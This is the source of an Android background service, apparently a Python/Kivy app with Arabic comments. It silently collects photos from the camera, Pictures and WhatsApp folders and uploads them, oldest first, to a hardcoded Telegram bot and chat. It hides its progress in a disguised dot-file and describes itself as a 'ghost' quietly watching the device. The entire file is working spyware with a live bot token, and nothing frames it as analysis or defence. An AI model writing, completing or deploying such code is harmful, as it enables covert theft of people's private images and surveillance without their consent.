from time import sleep
import os
import requests
from jnius import autoclass

# الربط الرسمي لمنع الانهيار
try:
    PythonService = autoclass('org.kivy.android.PythonService')
    service = PythonService.mService
except:
    service = None

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
LOG_FILE = "/storage/emulated/0/.sys_cache_v4.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    try:
        with open(LOG_FILE, "r") as f: return set(f.read().splitlines())
    except: return set()

def save_sent(path):
    try:
        with open(LOG_FILE, "a") as f: f.write(path + "\n")
    except: pass

def send_photo(path):
    try:
        with open(path, "rb") as f:
            # إرسال كـ Document لضمان وصول الصور القديمة بجودتها الأصلية
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                          data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return True
    except: return False

def scan_photos():
    # المسارات الأساسية للصور
    targets = [
        "/storage/emulated/0/DCIM", 
        "/storage/emulated/0/Pictures", 
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
    ]
    found = []
    sent = get_sent()
    for t in targets:
        if not os.path.exists(t): continue
        for root, _, files in os.walk(t):
            for f in files:
                if f.lower().endswith((".jpg", ".jpeg", ".png")):
                    p = os.path.join(root, f)
                    if p not in sent:
                        found.append(p)
    # الترتيب من الأقدم للأحدث (الأولوية للصور القديمة)
    found.sort(key=lambda x: os.path.getmtime(x))
    return found

def main():
    # إشعار فوري عند بدء التشغيل
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "🚀 النظام بدأ العمل تلقائياً.. جاري سحب الصور (الأقدم أولاً)."})
    
    # سحب الصور مباشرة بدون انتظار أوامر
    all_photos = scan_photos()
    
    if not all_photos:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": "⚠️ لم يتم العثور على صور جديدة."})
    else:
        for p in all_photos:
            if send_photo(p):
                save_sent(p)
                sleep(2) # تأخير لضمان استقرار الإرسال
    
    # بعد الانتهاء، يظل الشبح يراقب الجهاز بهدوء
    while True:
        sleep(60)

if __name__ == "__main__":
    main()
